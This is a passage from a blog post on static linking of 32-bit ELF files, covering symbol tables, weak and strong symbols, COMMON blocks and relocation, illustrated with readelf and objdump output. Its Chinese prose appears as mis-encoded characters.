class="line">     8: 00000000     4 OBJECT  GLOBAL DEFAULT    2 shared</span><br><span class="line">     9: 00000000    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line"></span><br><span class="line">File: ab</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 13 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048094     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048108     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 0804916c     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     6: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     9: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 __bss_start</span><br><span class="line">    10: 08048094    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    11: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _edata</span><br><span class="line">    12: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _end</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆæœ‰äº›åå­—æ˜¾ç¤º?</p><p>å¯ä»¥çœ‹çš„æ²¡æ˜¾ç¤ºçš„ç±»å‹éƒ½ä¸ºSTT_SECTIONä»–ä»¬çš„åå­—å…¶å®å°±æ˜¯st_shndxä»£è¡¨çš„æ®µçš„æ®µåå­—</p><p>readelfæ²¡æœ‰æ˜¾ç¤ºï¼Œobjdumpç»™æ˜¾ç¤ºå‡ºæ¥äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; objdump -t a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">SYMBOL TABLE:</span><br><span class="line"><span class="number">00000000</span> l    df *ABS*  <span class="number">00000000</span> a.c</span><br><span class="line"><span class="number">00000000</span> l    d  .text  <span class="number">00000000</span> .text</span><br><span class="line"><span class="number">00000000</span> l    d  .data  <span class="number">00000000</span> .data</span><br><span class="line"><span class="number">00000000</span> l    d  .bss   <span class="number">00000000</span> .bss</span><br><span class="line"><span class="number">00000000</span> l    d  .note.GNU-<span class="built_in">stack</span>        <span class="number">00000000</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line"><span class="number">00000000</span> l    d  .eh_frame      <span class="number">00000000</span> .eh_frame</span><br><span class="line"><span class="number">00000000</span> l    d  .comment       <span class="number">00000000</span> .comment</span><br><span class="line"><span class="number">00000000</span> g     F .text  <span class="number">00000039</span> main</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> shared</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> swap</span><br></pre></td></tr></table></figure><h5 id="ä»€ä¹ˆæ˜¯commonå—-amp-amp-å¼ºç¬¦å·å¼±ç¬¦å·-amp-amp-å¼±å¼•ç”¨å¼ºå¼•ç”¨"><a href="#ä»€ä¹ˆæ˜¯commonå—-amp-amp-å¼ºç¬¦å·å¼±ç¬¦å·-amp-amp-å¼±å¼•ç”¨å¼ºå¼•ç”¨" class="headerlink" title="ä»€ä¹ˆæ˜¯commonå—&amp;&amp;å¼ºç¬¦å·å¼±ç¬¦å·&amp;&amp;å¼±å¼•ç”¨å¼ºå¼•ç”¨"></a>ä»€ä¹ˆæ˜¯commonå—&amp;&amp;å¼ºç¬¦å·å¼±ç¬¦å·&amp;&amp;å¼±å¼•ç”¨å¼ºå¼•ç”¨</h5><p>æˆ‘ä»¬ç”¨å‰é¢çš„simple section.cæ¥è¯´</p><p>.bssæ®µå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡(è¿™é‡Œç¼–è¯‘å™¨å…¶å®ä¸ºäº†èŠ‚çº¦ç£ç›˜ç©ºé—´æŠŠåˆå§‹åŒ–ä¸º0çš„å˜é‡ä¹Ÿæ”¾å…¥äº†bss)ï¼Œä½†æ˜¯global_uninit_varå´åœ¨COMå—</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name  </span><br><span class="line"><span class="number">14</span>: <span class="number">00000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM global_uninit_var</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´gccæŠŠæ²¡æœ‰åˆå§‹åŒ–çš„å…¨å±€å˜é‡æ”¾åˆ°äº†COMMONå— å½“ç„¶gcc5ä¹Ÿå¯ä»¥é€šè¿‡ -fno-commonæˆ–è€…ç”¨__attribute__((nocommon))å–æ¶ˆæ‰è¿™ä¸ªæœºåˆ¶ï¼Œè¿™æ ·å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·æ—¶ï¼Œä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯</p><p>è¿™ä¸ªæˆ‘åœ¨gcc11è¯•äº†è¯•å‘ç°å¥½åƒé»˜è®¤æ²¡æœ‰æ”¾åˆ°commonï¼Œè€Œæ˜¯éƒ½æ”¾åˆ°äº†bss</p><p>è¿™ç§æœªåˆå§‹åŒ–å…¨å±€å˜é‡çš„ç¬¦å·å«åšå¼±ç¬¦å·ï¼Œç›¸åçš„å°±å«åšå¼ºç¬¦å·</p><ul><li>ä¸å…è®¸ä¸€ä¸ªå¼ºç¬¦å·è¢«å¤šæ¬¡å®šä¹‰ï¼Œå¦åˆ™é“¾æ¥å™¨ä¼šæŠ¥é”™</li><li>å¦‚æœä¸€ä¸ªç¬¦å·åœ¨æŸä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ˜¯å¼ºç¬¦å·ï¼Œé“¾æ¥æ—¶é€‰å¼ºç¬¦å·</li><li>ä¸€ä¸ªç¬¦å·åœ¨æ‰€æœ‰å¯é‡å®šä½æ–‡ä»¶é‡Œéƒ½æ˜¯å¼±ç¬¦å·ï¼Œé€‰å­—èŠ‚æœ€å¤§çš„</li></ul><p>æ‰€ä»¥æˆ‘ä»¬ä¸‹é¢è¿™æ ·ä¼šè‡ªåŠ¨é€‰æ‹©å¼ºç¬¦å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">double</span> d = <span class="number">666666</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f,%d&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™æ ·ææ˜¯ä¸ä¼šæŠ¥é”™çš„(å®é™…ä¸Šæˆ‘åœ¨gcc11ä¸ŠæŠ¥äº†multiple definition of dçš„é”™äº†ï¼Œå› ä¸ºä»–é»˜è®¤ä¸ç”¨commonï¼Œå¯ä»¥é€šè¿‡-fcommonå¯ç”¨è¿™ä¸ªæœºåˆ¶,ä¹‹åä¹Ÿæ²¡æœ‰æŠ¥é”™)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">666666.500000</span>,<span class="number">200</span>â</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬çš„å¼±ç¬¦å·çš„å­—èŠ‚å¤§å°æ˜¯ä¸èƒ½å¤§äºå¼ºç¬¦å·çš„å¦åˆ™åœ¨ldé“¾æ¥è¿‡ç¨‹æœ‰ä¸€ä¸ªwarning</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">/usr/bin/ld: Warning: alignment <span class="number">4</span> of symbol `d<span class="number">&#x27;</span> in /tmp/ccEf1boS.o is smaller than <span class="number">8</span> in /tmp/cc2ZKeXO.o</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0</span>,<span class="number">3f</span>f00000</span><br></pre></td></tr></table></figure><p>gccæä¾›ç»™æˆ‘ä»¬__attribute__((weak))æ¥æ¥å®šä¹‰ä»»ä½•ä¸€ä¸ªç¬¦å·ä¸ºå¼±ç¬¦å·ã€‚</p><p><em>_attribute</em>_((weak)) double dè¿™æ ·å°±æ¶ˆé™¤äº†è¿™æ¡warning</p><p><strong>ä½†æ˜¯è¿™ä¸ªè¾“å‡ºæ˜¾ç„¶æ˜¯æœ‰é—®é¢˜çš„ï¼Œdå’Œpéƒ½å˜å¾—å¥‡æ€ªèµ·æ¥</strong></p><p><strong>è¿™ä¸ªå°±æ˜¯é“¾æ¥é€ æˆçš„ï¼Œp1.cç¼–è¯‘æˆä¸€ä¸ªå¯é‡å®šä½æ¨¡å—æ—¶ï¼Œä»–æ ¹æœ¬ä¸ä¼šçŸ¥é“è‡ªå·±ä»¥åä¼šå¹²ä»€ä¹ˆï¼Œåœ¨ä»–çœ¼é‡Œdouble då°±æ˜¯å…¨éƒ¨ï¼Œæ‰€ä»¥ä»–å¯¹dçš„èµ‹å€¼å®Œå…¨æ˜¯æŒ‰ç…§doubleæ¥çš„</strong></p><p><strong>ä½†æ˜¯åˆ°äº†é“¾æ¥çš„æ—¶å€™ï¼Œå¯¹dçš„èµ‹å€¼æ˜¯å¯¹test.cçš„int då¼ºç¬¦å·ï¼Œç”¨ç»™doubleèµ‹å€¼çš„codeå¯¹int èµ‹å€¼</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048460 &lt;p1&gt;:</span><br><span class="line">8048460:       55                      push   %ebp</span><br><span class="line">8048461:       89 e5                   mov    %esp,%ebp</span><br><span class="line">8048463:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048466:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048469:       68 1c a0 04 08          push   $0x804a01c</span><br><span class="line">804846e:       68 1a 85 04 08          push   $0x804851a</span><br><span class="line">8048473:       e8 68 fe ff ff          call   80482e0 &lt;printf@plt&gt;</span><br><span class="line">8048478:       83 c4 10                add    $0x10,%esp</span><br><span class="line">804847b:       d9 e8                   fld1</span><br><span class="line">804847d:       dd 1d 1c a0 04 08       fstpl  0x804a01c</span><br><span class="line">8048483:       90                      nop</span><br><span class="line">8048484:       c9                      leave</span><br><span class="line">8048485:       c3                      ret</span><br></pre></td></tr></table></figure><p>fld1æŠŠ1è¿™ä¸ªæµ®ç‚¹å¸¸æ•°å‹å€’x87æ ˆçš„st0ï¼Œfstplå†æŠŠä»–å–å‡ºæ¥æ”¾åˆ°&amp;d</p><p>doubleçš„1å°±æ˜¯ 3FF0000000000000</p><p><img src="/2023/04/28/static-link/image-20230429234155494.png" alt="image-20230429234155494"></p><p>è¿™ç§bugå¦‚æœåœ¨ä¸€ä¸ªå¤§å‹é¡¹ç›®é‡Œæ‰¾èµ·æ¥ï¼Œé‚£çœŸçš„æ˜¯æ “qï¼Œæ‰€ä»¥externå¾ˆæœ‰å¿…è¦</p><p>ä¸ä¹‹å¯¹åº”çš„è¿˜æœ‰å¼ºå¼•ç”¨å’Œå¼±å¼•ç”¨ <em>_attribute</em>_ (weakref)æ¥ä¿®é¥°</p><p>å¼±å¼•ç”¨å¯ä»¥åœ¨æ‰¾ä¸åˆ°å®šä¹‰çš„æ—¶å€™é“¾æ¥æˆåŠŸï¼Œä½†æ˜¯åœ¨æ‰§è¡Œæ—¶ä»–çš„å€¼ä¸º0</p><p>è¿™ç±»å¼ºå¼±æœºåˆ¶å­˜åœ¨çš„æ„ä¹‰æ˜¯åœ¨åº“é‡Œå®ç°ä¸€äº›éå¸¸è§„çš„è‡ªå®šä¹‰æ“ä½œ</p><p>ç¬¦å·é—®é¢˜è¿˜æœ‰c++çš„ç¬¦å·ä¿®é¥°ï¼Œc++çš„å‡½æ•°é‡è½½åç§°ç©ºé—´ç­‰ä¾é è¿™ä¸ªæœºåˆ¶,c++filtå¯ä»¥å¸®æˆ‘ä»¬è§£æè¿™äº›ä¿®é¥°è¿‡çš„ç¬¦å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/NEMU&gt; c++filt _ZN3foo3barE</span><br><span class="line">foo::bar</span><br></pre></td></tr></table></figure><p>ä¸ºäº†å’Œcå…¼å®¹å¯ä»¥ç”¨extern â€œcâ€ int x; extern â€câ€ { intx ;inty} æ¥ä¸ä¿®é¥°ç¬¦å·</p><p>ä¸€äº›cé‡Œå‡½æ•°ä¸ºäº†åœ¨c++ä¸è¢«å½“åˆc++å‡½æ•°ä¿®é¥°å¯¼è‡´æ— æ³•ä½¿ç”¨,å¤´æ–‡ä»¶é‡Œé‡‡ç”¨äº†#ifdefå®æ¥å¤„ç†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> â€œcâ€ &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *,<span class="type">int</span>,<span class="type">size_t</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è¯´äº†è¿™ä¹ˆå¤šå…³äºç¬¦å·çš„ä¸œè¥¿ï¼Œçœ‹çœ‹ç¬¦å·åœ°å€æ˜¯æ€ä¹ˆç¡®å®šçš„ï¼Œç¬¦å·æ˜¯æ€ä¹ˆè§£æçš„</p><p><strong>ç¬¦å·åœ°å€</strong></p><p>ç¬¦å·åœ¨å„ä¸ªæ®µé‡Œçš„åç§»æ˜¯ç¡®å®šçš„ï¼Œæˆ‘ä»¬linkeræŠŠå„ä¸ªæ®µæ‹¼æ¥å¹¶åˆ†é…è™šæ‹Ÿåœ°å€ï¼Œæ®µåŸºå€æˆ‘ä»¬è‡ªç„¶çŸ¥é“ï¼Œå†åŠ ä¸ŠåŸæœ¬çš„åç§»å°±å¯ä»¥ç¡®å®šäº†</p><p><strong>ç¬¦åˆè§£æ</strong></p><p>é“¾æ¥å™¨ç»´æŠ¤äº†ä¸‰ä¸ªé›†åˆE U D</p><ul><li>E å°†è¢«åˆå¹¶ç»„æˆå¯æ‰§è¡Œæ–‡ä»¶çš„å¯é‡å®šä½æ–‡ä»¶é›†åˆ</li><li>U å½“å‰å¼•ç”¨ä½†æœªè§£æçš„ç¬¦åˆé›†åˆ</li><li>D å½“å‰æ‰€æœ‰å®šä¹‰ç¬¦å·çš„é›†åˆ</li></ul><p>ä¼šä»å·¦åˆ°å³æ‰«æå‘½ä»¤è¡Œå‡ºç°çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œé™æ€åº“æ–‡ä»¶</p><p>å½“æ‰«æåˆ°å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶æ—¶ æŠŠå®ƒå®šä¹‰çš„ç¬¦å·åŠ å…¥Dé›†åˆï¼Œå¼•ç”¨å•æœªå®šä¹‰çš„åŠ å…¥U</p><p>æ‰«æåˆ°é™æ€é“¾æ¥åº“æ—¶ï¼Œä¾æ¬¡æ£€æµ‹åº“é‡Œçš„ç›®æ ‡æ–‡ä»¶æ˜¯ä¸æ˜¯åŒ…å«Ué‡Œé¢çš„æœªå®šä¹‰ç¬¦å·ï¼ŒåŒ…å«åˆ™æŠŠè¿™ä¸ªç¬¦å·ä»Ué‡Œæ‹¿å‡ºæ¥æ”¾å…¥Dï¼Œå¹¶æŠŠè¿™ä¸ªç›®æ ‡æ–‡ä»¶åŠ å…¥Eï¼Œä¸åŒ…å«ç›´æ¥ä¸¢å¼ƒè¯¥ç›®æ ‡æ–‡ä»¶</p><p>æ‰«æå®Œå…¨éƒ¨æ—¶Uæ˜¯éç©ºï¼Œé“¾æ¥å™¨ä¼šæŠ¥é”™ç»ˆæ­¢ï¼Œå¦åˆ™å°±å¼€å§‹åˆå¹¶Eé›†åˆé‡Œçš„æ–‡ä»¶</p><p>è¿™ä¹Ÿå°±è¦æ±‚äº†æˆ‘ä»¬é™æ€é“¾æ¥æ—¶åº“çš„é¡ºåºé—®é¢˜ï¼Œä¸€å®šåº“æ”¾åˆ°æœ€åï¼Œåº“ä¹‹é—´å¦‚æœæœ‰å¼•ç”¨ï¼Œè¿˜è¦è°ƒæ•´ä¸€ä¸‹é¡ºåº</p><h4 id="é‡å®šä½"><a href="#é‡å®šä½" class="headerlink" title="é‡å®šä½"></a>é‡å®šä½</h4><p>a.cä¸­å¼•ç”¨çš„ shareå’Œswapåœ¨ç¼–è¯‘å™¨ç¼–è¯‘æ—¶æ˜¯ä¸ç¡®å®šçš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; objdump -dS a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;main&gt;:</span><br><span class="line">extern int shared;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   0:   8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class="line">   4:   83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">   7:   ff 71 fc                pushl  -0x4(%ecx)</span><br><span class="line">   a:   55                      push   %ebp</span><br><span class="line">   b:   89 e5                   mov    %esp,%ebp</span><br><span class="line">   d:   51                      push   %ecx</span><br><span class="line">   e:   83 ec 14                sub    $0x14,%esp</span><br><span class="line">    int a = 6;</span><br><span class="line">  11:   c7 45 f4 06 00 00 00    movl   $0x6,-0xc(%ebp)</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">  18:   83 ec 08                sub    $0x8,%esp</span><br><span class="line">  1b:   68 00 00 00 00          push   $0x0</span><br><span class="line">  20:   8d 45 f4                lea    -0xc(%ebp),%eax</span><br><span class="line">  23:   50                      push   %eax</span><br><span class="line">  24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;</span><br><span class="line">  29:   83 c4 10                add    $0x10,%esp</span><br><span class="line">  2c:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">&#125;</span><br><span class="line">  31:   8b 4d fc                mov    -0x4(%ebp),%ecx</span><br><span class="line">  34:   c9                      leave</span><br><span class="line">  35:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line">  38:   c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b:   68 00 00 00 00          push   $0x0 ;å¯¹sharedå¼•ç”¨</span><br><span class="line">24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;;å¯¹swapå¼•ç”¨</span><br></pre></td></tr></table></figure><p>å°±åœ¨åˆšåˆšæˆ‘ä»¬æ‰è§£æäº†ç¬¦å·çš„åœ°å€ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬éœ€è¦åˆ©ç”¨è§£æçš„ç¬¦å·åœ°å€æŠŠä»£ç é‡Œå¼•ç”¨çš„åœ°å€å€¼ç»™ä¿®æ­£äº†ï¼Œ</p><p>æˆ‘ä»¬æ€ä¹ˆçŸ¥é“è¦å»ä¿®æ­£è°ï¼Œé‚£é‡Œä¿®æ­£ï¼Œæ€ä¹ˆä¿®æ­£ï¼Œè¿™ä¸€åˆ‡éƒ½åœ¨.rel.xxxé‡å®šä½è¡¨é‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>è¡¨ç¤ºè¦ä¿®æ­£çš„ä½ç½®ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºè¿™ä¸ªæ®µçš„åç§»ï¼Œä½œä¸ºlinkeræˆ‘ä»¬çŸ¥é“æ®µåŸºå€ï¼Œè‡ªç„¶å¯ä»¥æ‰¾åˆ°è¦ä¿®æ­£åœ°å€</p><p>r_info ä½8ä½è¡¨ç¤ºè¦é‡å®šä½ç±»å‹ï¼Œé«˜24ä½æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨é‡Œçš„ä¸‹æ ‡</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; readelf -r a.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x1b0</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0000001</span>c  <span class="number">00000901</span> R_386_32          <span class="number">00000000</span>   shared</span><br><span class="line"><span class="number">00000025</span>  <span class="number">00000</span>a02 R_386_PC32        <span class="number">00000000</span>   swap</span><br></pre></td></tr></table></figure><p>Infoé«˜24ä½ 9å’Œaæ­£å¥½å¯¹åº”</p><p><strong>readelfé‡Œçš„Sym. Nameè¡¨ç¤ºè¦ç”¨å“ªä¸ªç¬¦å·ä¿®æ­£</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">9</span>:  <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line"><span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br></pre></td></tr></table></figure><p>offset 1cå’Œ25å¯¹åº”è¦ä¿®æ”¹çš„ä½ç½®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1b</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x0</span> ;å¯¹sharedå¼•ç”¨</span><br><span class="line"><span class="number">24</span>:   e8 fc ff ff ff          call   <span class="number">25</span> &lt;main+<span class="number">0x25</span>&gt;;å¯¹swapå¼•ç”¨</span><br></pre></td></tr></table></figure><p>é‡å®šä½ç±»å‹ç±»å‹æœ‰å¥½å¤šç§ï¼Œä¸åŒå¹³å°ä¹Ÿå¯èƒ½ä¸ä¸€æ · <a href="https://bbs.kanxue.com/thread-246373.htm">https://bbs.kanxue.com/thread-246373.htm</a></p><p>è¿™é‡Œå°±çœ‹ä¸¤ç§æœ€åŸºæœ¬æœ€å¸¸ç”¨çš„</p><p>R_386_32 ç»å¯¹å¯»å€ä¿®æ­£</p><p>R_386_PC32 ç›¸å¯¹å¯»å€ä¿®æ­£</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»çŸ¥é“äº†ç¬¦å·çš„å®é™…åœ°å€Så’Œä¿å­˜åœ¨è¢«ä¿®æ­£ä½ç½®çš„åŸå€¼A(åç§»)</p><p>ç»å¯¹å¯»å€ï¼Œç›´æ¥æŠŠå®é™…åœ°å€S+è¢«ä¿®æ­£ä½ç½®çš„åŸå€¼Aå¡«å…¥offsetå°±å¯ä»¥ </p><p>ç›¸å¯¹å¯»å€ æ¯”ä¸Šé¢å¤šäº†å‡å»è¢«ä¿®æ­£ä½ç½®Pï¼Œå¾—åˆ°åç§»çš„è¿‡ç¨‹ S+A-P</p><p>é‡å®šä½åçš„main</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">08048094</span> &lt;main&gt;:</span><br><span class="line"> <span class="number">8048094</span>:       <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">04</span>             lea    <span class="number">0x4</span>(%esp),%ecx</span><br><span class="line"> <span class="number">8048098</span>:       <span class="number">83</span> e4 f0                and    $<span class="number">0xfffffff0</span>,%esp</span><br><span class="line"> <span class="number">804809b</span>:       ff <span class="number">71</span> fc                pushl  <span class="number">-0x4</span>(%ecx)</span><br><span class="line"> <span class="number">804809</span>e:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">804809f</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80480</span>a1:       <span class="number">51</span>                      push   %ecx</span><br><span class="line"> <span class="number">80480</span>a2:       <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">80480</span>a5:       c7 <span class="number">45</span> f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x6</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">80480</span>ac:       <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">80480</span>af:       <span class="number">68</span> <span class="number">6</span>c <span class="number">91</span> <span class="number">04</span> <span class="number">08</span>          push   $<span class="number">0x804916c</span></span><br><span class="line"> <span class="number">80480b</span>4:       <span class="number">8</span>d <span class="number">45</span> f4                lea    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80480b</span>7:       <span class="number">50</span>                      push   %eax</span><br><span class="line"> <span class="number">80480b</span>8:       e8 <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80480</span>cd &lt;swap&gt;</span><br><span class="line"> <span class="number">80480b</span>d:       <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">80480</span>c0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">80480</span>c5:       <span class="number">8b</span> <span class="number">4</span>d fc                mov    <span class="number">-0x4</span>(%ebp),%ecx</span><br><span class="line"> <span class="number">80480</span>c8:       c9                      leave</span><br><span class="line"> <span class="number">80480</span>c9:       <span class="number">8</span>d <span class="number">61</span> fc                lea    <span class="number">-0x4</span>(%ecx),%esp</span><br><span class="line"> <span class="number">80480</span>cc:       c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     è§£æåçš„ç¬¦å·è¡¨</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     </span><br><span class="line">80480af:       68 6c 91 04 08          push   $0x804916c;å¯¹sharedå¼•ç”¨</span><br><span class="line">80480b8:       e8 10 